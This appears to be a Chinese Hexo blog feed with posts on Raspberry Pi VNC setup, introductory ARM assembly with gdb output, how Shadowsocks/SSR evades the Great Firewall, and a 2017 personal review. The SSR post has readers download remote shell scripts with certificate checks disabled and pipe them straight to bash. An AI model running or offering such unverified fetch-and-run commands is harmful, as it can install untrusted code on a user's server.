<h1 id="利用VNC远程控制"><a href="#利用VNC远程控制" class="headerlink" title="利用VNC远程控制"></a>利用VNC远程控制</h1><p>很多windows的用户想要图形化操作(需求不同)，所以单纯的命令行并不能满足我们，这个时候我们就要添加一个vnc server，再用相应软件连接（该教程为简化版）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line"></div><div class="line">sudo apt-get install tightvncserver</div></pre></td></tr></table></figure>
<p>安装完成后运行<code>tightvncserver</code>即可</p>
<p>这时会要求输入控制密码，选择性输入查看密码，查看密码只能用来查看桌面，而控制密码才能对桌面进行操作。</p>
<p>此后，在电脑上安装<a href="http://www.tightvnc.com/" target="_blank" rel="external">vnc软件</a></p>
<p>安装时，选择自定义安装，仅安装tightvncviewer就可以。</p>
<p>每个用户可以启动多个VNCSERVER远程桌面，它们用ip加端口号：ip:1、ip:2、ip:3 来标识、区分，使用同一端口会使另外登录的用户自动退出。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-25%20%E4%B8%8A%E5%8D%8812.35.07.png" alt="屏幕快照 2018-01-25 上午12.35.07.png" title="" class="">
                <p>屏幕快照 2018-01-25 上午12.35.07.png</p>
            </figure>
<p>我们也可以选择安装<a href="http://www.tightvnc.com/download.php" target="_blank" rel="external">VNC Viewer</a>，这个更加轻量级一些</p>
<p>下载Window版的 VNC-Viewer ，无需安装，解压即可。 比如，解压出：VNC-Viewer-5.0.3-Windows-32bit.exe</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-25%20%E4%B8%8A%E5%8D%8812.36.42.png" alt="屏幕快照 2018-01-25 上午12.36.42.png" title="" class="">
                <p>屏幕快照 2018-01-25 上午12.36.42.png</p>
            </figure>
<p>参考：<a href="https://elinux.org/RPi_VNC_Server" target="_blank" rel="external">官网教程</a></p>
]]></content>
      
        <categories>
            
            <category> 树莓派 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 计算机硬件 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ARM汇编上手]]></title>
      <url>/2018/01/23/ARM%E6%B1%87%E7%BC%96%E4%B8%8A%E6%89%8B-%E4%B8%80/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/746171_500acl66acq5pji.gif" alt=""></p>
<p>今天稍微折腾了一下树莓派，想在上面学习一下ARM架构的汇编代码，给逆向稍微打点底子，同时也是把CISC和RISC两种不同的CPU架构做一个对比，看看有什么不同之处。</p>
<a id="more"></a>
<h1 id="CISC和RISC"><a href="#CISC和RISC" class="headerlink" title="CISC和RISC"></a>CISC和RISC</h1><p>这两种一个是精简指令集，一个是复杂指令集，在大学的微机课上我们应该会学到x86处理器的汇编指令，这个是属于复杂指令集，而我们生活中最常见的其实是精简指令集系统，如ARM/MIPS，我们的手机等就是用的这个。下面我们从体系结构的方面来对比一下。</p>
<h3 id="load-store体系结构"><a href="#load-store体系结构" class="headerlink" title="load-store体系结构"></a>load-store体系结构</h3><p>RISC使用的是load-store结构。load-store结构的本质，在于RISC技术的CPU只处理（指逻辑，算术运算处理）寄存器中的数据。相反，X86却能够直接处理存储器中的数据。</p>
<p>RISC体系架构的CPU，存储器和寄存器之间的数据交互，由专门的load和store指令负责。存储器是指内存或者Flash（NOR Flash）等可以被CPU直接寻址的存储单元。CPU要将某个地址的数据放入寄存器中，只能够使用load指令；要将寄存器中的值存放到存储器中，只能够使用store指令。</p>
<p>CISC体系架构的CPU对存储器数据操作则要复杂得多。在X86下，数据的传送都是使用MOV指令。MOV指令既负责寄存器和寄存器之间数据的交互，又负责寄存器和存储器之间的数据交互。X86能够直接处理存储器中的数据，而这一点在RISC体系的CPU中是无法做到的。</p>
<p>将存储器单元0x00000020中的数加上8，结果存放到该存储单元中。假设存储单元的地址0x00000020已经存放在寄存器reg中，即reg=0x00000020，下文中，(reg)表示reg地址处的值，即存储单元中的值。下面我们看看在X86下和ARM/MIPS下分别是如何操作的。</p>
<p>X86能够直接处理存储器中的数据， 所以X86直接寻址到存储器地址，将存储器中的值和立即数相加，结果存放到存储器单元中。整个过程使用下面一条指令就可以完成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">add (reg) 0x08		;直接将存储器单元(reg)中的值加0x08，结果仍然存放在该存储器单元中</div></pre></td></tr></table></figure>
<p>ARM/MIPS只能够处理寄存器中的数据，所以需要将该存储器中的值用load命令加载到寄存器中，然后对寄存器中的值进行算术运算，最后使用store命令将运算结果送回存储单元中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ld reg2 (reg)		;将存储器单元(reg)中的值加载到寄存器reg2中 </div><div class="line">add reg2 0x08		;将寄存器reg2中的值加0x08，结果存到在寄存器reg2中 </div><div class="line">store (reg) reg2	;将寄存器reg2中的值放回存储器单元(reg)中</div></pre></td></tr></table></figure>
<p>硬币有两面，精简指令集也有它的优势和劣势。其中一个重要的优势是指令可以被更快的执行（RISC处理器通过引入流水线机制，减少每个指令的占用的CPU的时钟周期来缩短执行时间）。它的劣势也很明显，较少的指令增加了软件（事实上是编译器）的复杂性。另一个重要的事实是，ARM具有两种运行模式（可以类比x86的实模式和保护模式），ARM模式和Thumb模式。</p>
<h1 id="初识ARM"><a href="#初识ARM" class="headerlink" title="初识ARM"></a>初识ARM</h1><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>在ARM结构中，数据类型只有字和字节(又分为有符号和无符号类型的)，下面是一些数据加载和存储的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">ldr =加载字</div><div class="line">ldr h =加载无符号半字</div><div class="line">ldr sh =加载有符号半字</div><div class="line">ldr b =加载无符号字节</div><div class="line">ldr sb =加载有符号字节</div><div class="line"></div><div class="line">str =存储字符</div><div class="line">str h =存储无符号半字符</div><div class="line">str sh =存储有符号半字符</div><div class="line">str b =存储未签名的字节</div><div class="line">str sb =存储已签名的字节</div></pre></td></tr></table></figure>
<h3 id="大端和小端"><a href="#大端和小端" class="headerlink" title="大端和小端"></a>大端和小端</h3><p>我们在查看内存中的字节的时候有两种基本的方法就是大端和小端。区别在于对象的每个字节在内存中的存储顺序</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-23%20%E4%B8%8B%E5%8D%8811.53.47.png" alt="屏幕快照 2018-01-23 下午11.53.47.png" title="" class="">
                <p>屏幕快照 2018-01-23 下午11.53.47.png</p>
            </figure>
<p>以ARMv6为例，指令是固定的小端，数据的访问可以是由程序状态寄存器（CPSR）的第九位来控制的小端或大端。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-23%20%E4%B8%8B%E5%8D%888.40.27.png" alt="屏幕快照 2018-01-23 下午8.40.27.png" title="" class="">
                <p>屏幕快照 2018-01-23 下午8.40.27.png</p>
            </figure>
<h3 id="ARM中的寄存器"><a href="#ARM中的寄存器" class="headerlink" title="ARM中的寄存器"></a>ARM中的寄存器</h3><p>我们知道在8086中有14个寄存器，而在ARM中寄存器中要更多一些，我们通过一张表将我们熟悉的x86和ARM联系起来</p>
<table>
<thead>
<tr>
<th>ARM</th>
<th>Description</th>
<th>x86</th>
</tr>
</thead>
<tbody>
<tr>
<td>R0</td>
<td>General Purpose</td>
<td>EAX</td>
</tr>
<tr>
<td>R1-R5</td>
<td>General Purpose</td>
<td>EBX, ECX, EDX, ESI, EDI</td>
</tr>
<tr>
<td>R6-R10</td>
<td>General Purpose</td>
<td>–</td>
</tr>
<tr>
<td>R11 (FP)</td>
<td>Frame Pointer</td>
<td>EBP</td>
</tr>
<tr>
<td>R12</td>
<td>Intra Procedural Call</td>
<td>–</td>
</tr>
<tr>
<td>R13 (SP)</td>
<td>Stack Pointer</td>
<td>ESP</td>
</tr>
<tr>
<td>R14 (LR)</td>
<td>Link Register</td>
<td>–</td>
</tr>
<tr>
<td>R15 (PC)</td>
<td>&lt;- Program Counter / Instruction Pointer -&gt;</td>
<td>EIP</td>
</tr>
<tr>
<td>CPSR</td>
<td>Current Program State Register/Flags</td>
<td>EFLAGS</td>
</tr>
</tbody>
</table>
<p>通过对照在x86中的寄存器我们就能知道在ARM中这些寄存器的用途了，其中主要说一下R14，R15:</p>
<p><strong>R14：LR</strong>（链接寄存器）。当进行函数调用时，链接寄存器将通过引用下一条指令的内存地址进行更新。这样做可以使程序在“子”功能结束后返回到启动“子”功能调用的“父”功能。</p>
<p><strong>R15：PC</strong>（程序计数器）。程序计数器自动递增执行指令的大小。这个大小在ARM状态下总是4个字节，在THUMB模式下总是2个字节。当执行分支指令时，PC保存目标地址。在执行期间，ARM状态下PC存储当前指令的地址加上8个字节（两个ARM指令），Thumb状态下是当前指令加上4个字节（两个Thumb指令）。这和x86上的PC总是会指向下一条被执行的语句不同</p>
<p>首先来看看下面这个例子，主函数中大概是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">main:</div><div class="line">	mov r0, pc</div><div class="line"> 	mov r1, #2</div><div class="line"> 	add r2, r1, r1</div><div class="line"> 	bkpt</div></pre></td></tr></table></figure>
<p>我们首先在主函数入口处打一个断点，然后查看一下寄存器的信息，发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">(gdb) break main</div><div class="line">Breakpoint 8 at 0x10408: file hello.s, line 27.</div><div class="line">(gdb) r</div><div class="line">The program being debugged has been started already.</div><div class="line">Start it from the beginning? (y or n) y</div><div class="line">Starting program: /home/pi/hello</div><div class="line"></div><div class="line">Breakpoint 8, main () at hello.s:27</div><div class="line">27		mov r0, pc</div><div class="line">(gdb) info registers</div><div class="line">r0             0x1	1</div><div class="line">r1             0x7efff344	2130703172</div><div class="line">r2             0x7efff34c	2130703180</div><div class="line">r3             0x10408	66568</div><div class="line">r4             0x1041c	66588</div><div class="line">r5             0x0	0</div><div class="line">r6             0x102e0	66272</div><div class="line">r7             0x0	0</div><div class="line">r8             0x0	0</div><div class="line">r9             0x0	0</div><div class="line">r10            0x76fff000	1996484608</div><div class="line">r11            0x0	0</div><div class="line">r12            0x7efff270	2130702960</div><div class="line">sp             0x7efff1f0	0x7efff1f0</div><div class="line">lr             0x76e7a678	1994892920</div><div class="line">pc             0x10408	0x10408 &lt;main&gt;</div><div class="line">cpsr           0x60000010	1610612752</div></pre></td></tr></table></figure>
<p>然后执行下一条之后我们再看看寄存器中的值，r0中是多少，是0x10408么？让我们拭目以待</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">(gdb) next</div><div class="line"></div><div class="line">Breakpoint 7, main () at hello.s:28</div><div class="line">28	 	mov r1, #2</div><div class="line">(gdb) info registers</div><div class="line">r0             0x10410	66576</div><div class="line">r1             0x7efff344	2130703172</div><div class="line">r2             0x7efff34c	2130703180</div><div class="line">r3             0x10408	66568</div><div class="line">r4             0x1041c	66588</div><div class="line">r5             0x0	0</div><div class="line">r6             0x102e0	66272</div><div class="line">r7             0x0	0</div><div class="line">r8             0x0	0</div><div class="line">r9             0x0	0</div><div class="line">r10            0x76fff000	1996484608</div><div class="line">r11            0x0	0</div><div class="line">r12            0x7efff270	2130702960</div><div class="line">sp             0x7efff1f0	0x7efff1f0</div><div class="line">lr             0x76e7a678	1994892920</div><div class="line">pc             0x1040c	0x1040c &lt;main+4&gt;</div><div class="line">cpsr           0x60000010	1610612752</div></pre></td></tr></table></figure>
<p>我们发现r0寄存器中的值是main函数入口的地址+8，在我们直接观察pc的时候，它指向的是下一条指令的地址，但是在调试的时候，我们发现是pc中的值+8，那么为什么会有这样的结果呢，这个涉及到CPU流水线的问题，我们放在之后再讨论。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>看雪安全论坛</li>
<li><a href="https://azeria-labs.com" target="_blank" rel="external">外国友人博客</a></li>
<li><a href="https://www.anquanke.com/post/id/86536" target="_blank" rel="external">gdb使用方式</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 汇编语言 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SSR原理和搭建翻墙服务器]]></title>
      <url>/2018/01/21/SSR%E5%8E%9F%E7%90%86%E5%92%8C%E6%90%AD%E5%BB%BA%E7%BF%BB%E5%A2%99%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-21%20%E4%B8%8B%E5%8D%885.17.00.png" alt=""></p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-21%20%E4%B8%8B%E5%8D%885.18.06.png" alt=""></p>
<p>终于考完试了，为了防止之前的搭建教程被墙了，也是巩固一下网络知识，重新整理一篇关于利用SSR翻墙的博客</p>
<a id="more"></a>
<h1 id="SS"><a href="#SS" class="headerlink" title="SS"></a>SS</h1><h2 id="SS的简单介绍"><a href="#SS的简单介绍" class="headerlink" title="SS的简单介绍"></a>SS的简单介绍</h2><p>SSR是原版基础上衍生出来的第三方版本，兼容原版协议，比原版多了一些伪装功能（协议和混淆）。要了解SSR，首先看看SS是什么，SS的全称是Shadowsocks，是一位在知乎网站工作的大神开发的一套针对DPI（深度包检测）系统弱点开发的一套网络加密工具。简单理解的话，Shadowsocks是将以前通过SSH创建的Socks5协议拆开成Server端和client端。它通过抹除网络数据通讯的特征，让监测系统无法下手。但是这种方法也不是绝对无法下手的，就好比说，你在一个鱼缸中找到一条鱼很容易，但是如果把这条鱼丢到海里再让你来找，那么就变的很困难了。而SS也正是通过这样将自己的通讯模式变的毫无特征，那么拦截系统在拦截的时候，就需要对每一个水滴进行检测，也就是说在目前各个国家的运算力是无法达到的。</p>
<p>那么SS是如何做到这样的功能呢？首先看看之前的VPN等。在这之前的VPN之类的都有一个致命的缺陷就是它们虽然通过了无法破解的RSA加密算法来对数据进行加密，但是在交换密钥建立起隧道之前还是在进行明文传输：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-21%20%E4%B8%8B%E5%8D%882.40.24.png" alt="屏幕快照 2018-01-21 下午2.40.24.png" title="" class="">
                <p>屏幕快照 2018-01-21 下午2.40.24.png</p>
            </figure>
<p>那么窃听者正是利用了这一点来进行封锁，因为在交换密钥的这一过程中就可能会被暴力破解(目前GFW已经做到了暴力破解MPPE加密的能力)，那么也就是说你接下来所进行的加密完全没有任何的意义了，如果窃听者想要破坏你的通信，可以直接将你的线路掐掉，或者你们在交换密钥的时候约定好说四川话，窃听者在前面插播两句上海话，对端就会立刻终止加密传输，连接就会断开，从2016春，几乎所有的VPN协议以及网络加密传输协议，均可用不同的方式被破坏，导致整个通讯出现中断。</p>
<p>那么SS所做的一点就是提前规定好加密方式，换而言之，也就是提前双方商量好，我们要说武汉话，    这样就只有通信双方的人才会听得懂，网络上的语言是无限的，所以只要提前规定好，SS就是如此的神奇，但是还是会有办法的，就是SS的作者被请去喝茶删代码了，但是github上down下来的人不止一份，本着开源的精神分享了出来。下面是原理图</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-21%20%E4%B8%8B%E5%8D%883.14.11.png" alt="屏幕快照 2018-01-21 下午3.14.11.png" title="" class="">
                <p>屏幕快照 2018-01-21 下午3.14.11.png</p>
            </figure>
<ol>
<li>PC客户端（即你的电脑）发出请求基于Socks5协议跟SS-Local端进行通讯，由于这个SS-Local一般是本机或路由器等局域网的其他机器，不经过GFW，所以解决GFW通过特征分析进行干扰的问题。</li>
<li>SS-Local和SS-Server两端通过多种可选的加密方法进行通讯，经过GFW的时候因为是常规的TCP包，没有明显特征码GFW也无法对通讯数据进行解密，因此通讯放行。</li>
<li>SS-Server将收到的加密数据进行解密，还原初始请求，再发送到用户需要访问的服务网站，获取响应原路再返回SS-04，返回途中依然使用了加密，使得流量是普通TCP包，并成功穿过GFW防火墙。</li>
</ol>
<p>Shadowsocks的优点在于它解决了GFW通过分析<a href="https://tumutanzi.com/archives/11973" target="_blank" rel="external">流量特征</a>从而干扰的问题。之前在<a href="http://peterpan980927.cn/2017/10/07/GFW-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" target="_blank" rel="external">GFW和中间人攻击</a>的博客中说过对于VPN的流量特征进行检测方法。</p>
<h2 id="SS的性能"><a href="#SS的性能" class="headerlink" title="SS的性能"></a>SS的性能</h2><p>关于SS的性能方面也需要简单的说一下，因为网上的SS实现有很多不同的版本，python啊，php之类的，通常我们在路由中使用的是C的，因为所谓的智能路由，事实上是一个低配版的电脑，普通的i3 CPU大约每秒可以进行70Mbits左右的数据，而这个低配版智能进行5Mbits，所以在上面跑所谓的脚本语言是很吃力的，如果我们需要很快的速度，加密模式和语言都是我们需要考虑的因素。</p>
<p>如果说只是在自己的PC机上面跑一跑，那么就不需要那么麻烦了，python也是可以的，如果移殖到路由上的话，内存大小和CPU性能都会是我们所需要考虑的因素，我们平时在电脑和手机上跑的流畅的应用移植到路由上都需要我们重新考虑</p>
<h1 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h1><p>首先你需要一台VPS，VPS的提供商我们可以选择Digital Ocean，因为之前推出的一个github学生特权(给github写英文邮件，如果你感动了它，就给你咯)，充值5¥送50¥。大概够我们使用约一年的时间，在之后也就是一个月折合34人民币，如果汇率一直没有发生变化的话，其实也不算贵。</p>
<p>然后就是创建VPS的过程了：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-21%20%E4%B8%8B%E5%8D%883.22.24.png" alt="屏幕快照 2018-01-21 下午3.22.24.png" title="" class="">
                <p>屏幕快照 2018-01-21 下午3.22.24.png</p>
            </figure>
<p>我们选择Cent6.x系列的操作系统，如果你不是一个docker使用者，选择7的话防火墙会使你有些头疼。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-21%20%E4%B8%8B%E5%8D%883.24.04.png" alt="屏幕快照 2018-01-21 下午3.24.04.png" title="" class="">
                <p>屏幕快照 2018-01-21 下午3.24.04.png</p>
            </figure>
<p>然后在下面的IPv6打个勾，虽然有时候我们的ISP并不支持，IPv6连不过去，辣鸡校园网，但是我们可以作为IPv6跳板</p>
<p>下面就是对于ssr-server端的配置了，直接将下面的代码复制到你的服务器终端中执行即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">yum -y install wget</div><div class="line"></div><div class="line">wget -N --no-check-certificate https://softs.fun/Bash/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</div><div class="line"></div><div class="line">备用下载地址：</div><div class="line"></div><div class="line">yum -y install wget</div><div class="line"></div><div class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</div></pre></td></tr></table></figure>
<p>之后我们可以配置一个通过TCP拥塞控制来进行加速的服务：BBR</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">yum -y install wget</div><div class="line"></div><div class="line">wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh</div><div class="line"></div><div class="line">chmod +x bbr.sh</div><div class="line"></div><div class="line">./bbr.sh</div></pre></td></tr></table></figure>
<p>可以通过下面两种方式来确定是否开启</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-21%20%E4%B8%8B%E5%8D%884.18.42.png" alt="屏幕快照 2018-01-21 下午4.18.42.png" title="" class="">
                <p>屏幕快照 2018-01-21 下午4.18.42.png</p>
            </figure>
<p>最后将那些信息都填入客户端，然后我们就可以愉快的上网了，我们还可以通过下面的网站测试一下我们的速度：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-21%20%E4%B8%8B%E5%8D%884.27.51.png" alt="屏幕快照 2018-01-21 下午4.27.51.png" title="" class="">
                <p>屏幕快照 2018-01-21 下午4.27.51.png</p>
            </figure>
<p>至于客户端的下载地址我也分享一下：</p>
<p>Windows SSR客户端 <a href="https://github.com/shadowsocksr-backup/shadowsocksr-csharp/releases" target="_blank" rel="external">下载地址</a> <a href="https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z" target="_blank" rel="external">备用下载地址</a></p>
<p>MAC SSR客户端 <a href="https://github.com/shadowsocksr-backup/ShadowsocksX-NG/releases" target="_blank" rel="external">下载地址</a> <a href="https://nofile.io/f/jgMWFwCBonU#ab0d3c3b6ac54482" target="_blank" rel="external">备用下载地址</a></p>
<p>Linux客户端一键安装配置 <a href="https://github.com/the0demiurge/CharlesScripts/blob/master/charles/bin/ssr" target="_blank" rel="external">使用脚本</a> (使用方法见注释) 或者采用图形界面的<a href="https://github.com/erguotou520/electron-ssr/releases" target="_blank" rel="external">linux ssr客户端</a></p>
<p>安卓 SSR客户端 <a href="https://github.com/shadowsocksr-backup/shadowsocksr-android/releases" target="_blank" rel="external">下载地址</a> <a href="https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk" target="_blank" rel="external">备用下载地址</a></p>
<h2 id="有趣的事情"><a href="#有趣的事情" class="headerlink" title="有趣的事情"></a>有趣的事情</h2><p>今天在查看我的服务器的时候，莫名的发现了一个奇怪的IP(我家的出口IP我还是记得很清楚的)，于是乎我就查了查，发现是一个来自江西的联通IP，我一想这还了得，这小子想干什么，我的服务器还是做了一些防护的，目前版本也没什么漏洞新发布出来，怎么就用上了我的SSR呢？难道是瞎猫碰上死耗子，不行，于是我就修改了所有的参数，一看，还在！！！</p>
<p>那可能是真的在我服务器上留后门了，我干脆重装了一次，然后升级内核，浏览了论坛，好像也没什么发生啊，重新部署之后发现这家伙还在，这尼玛我就很无奈了啊，然后把自己的客户端关了，就不见了，我一想，难道是IP根本就是错的，于是在提点下知乎搜索了一番联通和IP的故事，然后发现了：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-21%20%E4%B8%8B%E5%8D%885.01.50.png" alt="屏幕快照 2018-01-21 下午5.01.50.png" title="" class="">
                <p>屏幕快照 2018-01-21 下午5.01.50.png</p>
            </figure>
<p>好吧，就怪我妈搞得这个长宽吧，还让我虚惊一场…</p>
<p>长宽租用基础运营商的带宽出口，然后他自己又没有这么多IP地址，于是只能在出口出做NAT，根据目标IP不同有不同的路由方向，所以访问不同的网站是通过不同的出口出去的。这样如果你访问的几个显示IP地址的网站正好不是一个出口，就会发现有多个IP。<br>甚至有些网站直接在长宽内网里有服务器，那么也有可能会显示你获取到的内网地址。</p>
<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><ul>
<li><a href="https://github.com/getlantern/forum/issues/5620" target="_blank" rel="external">GitHub上的issue</a></li>
<li><a href="https://program-think.blogspot.com" target="_blank" rel="external">编程随想的博客</a></li>
<li><a href="https://www.zhihu.com/question/29428996/answer/44492283" target="_blank" rel="external">知乎作者</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> SSR </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2017年度总结]]></title>
      <url>/2017/12/31/2017%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-04%20%E4%B8%8B%E5%8D%883.28.42.png" alt=""></p>
<a id="more"></a>
<h1 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h1><p>从生活的半年多的寝室直接搬了出来，夏天的时候睡在实验室，最近一个月比较冷于是在外面租了个房子，时间上感觉是过的挺快的，今年四月份加入实验室，现在已经八个多月了，如果要说为什么要从寝室搬出来睡在充满大妈恶意和老师的排斥的楼道，我也说不清楚，也许是一种氛围的原因吧，在实验室的时候和机器交流的时候反而会更加自在一些，技术上也得到了飞速的提升。</p>
<p>但是一旦来到了考试周学习的进度基本上就会停滞不前不前了，可能这也是为什么天朝的CS本科生毕业之后技术都跟💩一样的原因之一吧。</p>
<h1 id="从算法到技术"><a href="#从算法到技术" class="headerlink" title="从算法到技术"></a>从算法到技术</h1><h2 id="初学算法"><a href="#初学算法" class="headerlink" title="初学算法"></a>初学算法</h2><p>要说为什么会发生这样的转变，一个原因应该就是班助给我推荐了陈浩元学长，在寒假的时候刷了一下ACM的算法题，这也是我对于计算机入门的开始，大一上学期的时候玩玩闹闹也没有学到什么东西。后来开学又刷了一个月去新生赛玩了一下，虽然只拿了一个第六名，但是对于之前从来没有参加过这类比赛的我也算是一个小小的鼓励了吧。</p>
<p>之后的事情却出乎了我的意料，本来是想着就这样刷算法题，到大二大三的时候去水个区域赛的牌子，到时候去当个算法工程师也不错。这个时候正好新思路招新摆台，本来我是没有什么兴趣的，但是在室友的踊跃报名之下，我决定去看看到底这个实验室是什么样子(大一上学期的时候觉得很厉害的说)，投了简历之后就来到了笔试环节，当时报的一个学习英语的班刚开课，时间冲突，于是我想那就不去了吧，反正待在陈浩元学长那刷题也不错。</p>
<h2 id="iOS组的生活"><a href="#iOS组的生活" class="headerlink" title="iOS组的生活"></a>iOS组的生活</h2><p>但是一条qq消息让这件事情出现了转机，当时的马均衡学长发来一条消息问我对iOS感不感兴趣，提前来面试一下，我突然激动了一下，因为以前从来没有过这种情况，于是我怀着激动的心情来到了新思路实验室。</p>
<p>第二天的早上我来到507的门口，看到里面的学长学姐对着电脑，上面呈现出五颜六色的代码块，对当时除了C语言什么也不会的我还是造成了相当大的冲击，后来就是面试过程了，问了我一些C语言有趣的的问题，因为刷了一个多月算法，加上当时还是想学，自己了解过，于是就免笔试通过了。</p>
<p>之后就加入了iOS组进行考核，但不一样的是，带我的并不是本科生，而是一个研究生学长(金子威)，一开始并没有让我上手学习OC，更别说swift，而是继续巩固我的C语言，对于内存分区，指针有了深刻的理解之后才上手OC，接下来一个月考核的时间做了三个考核项目，第一天晚上其实就没回去，金子威学长很好心的给我提供了床和枕头，还有一个毯子，这种感觉其实还不错，然后就开始了我的逃课iOS之旅。</p>
<h2 id="iOS到Geek"><a href="#iOS到Geek" class="headerlink" title="iOS到Geek"></a>iOS到Geek</h2><p>在iOS待了半个学期之后就加入了金子威学长自己成立的Geek组，这是一个非常大胆的创新，他因此也承受了很多的压力，背了很多锅，最后成立下来到现在成长的很好付出了很多的努力，其实还是很感谢他的。</p>
<p>来到Geek组之后，似乎变成了以前电影中看到的人物，那些黑客们在黑窗口下飞速的操作，攻破一个又一个的服务器，在睡梦中的我都不自禁笑了起来，虽然也没有那么夸张，现在只是一个脚本小子罢了，高级的漏洞利用也没有实现过，所以当一些同学纷纷大神大神的叫起来的时候，我感觉如芒在背，甚至羞愧脸红，不是我强，是防护能力太弱呀！</p>
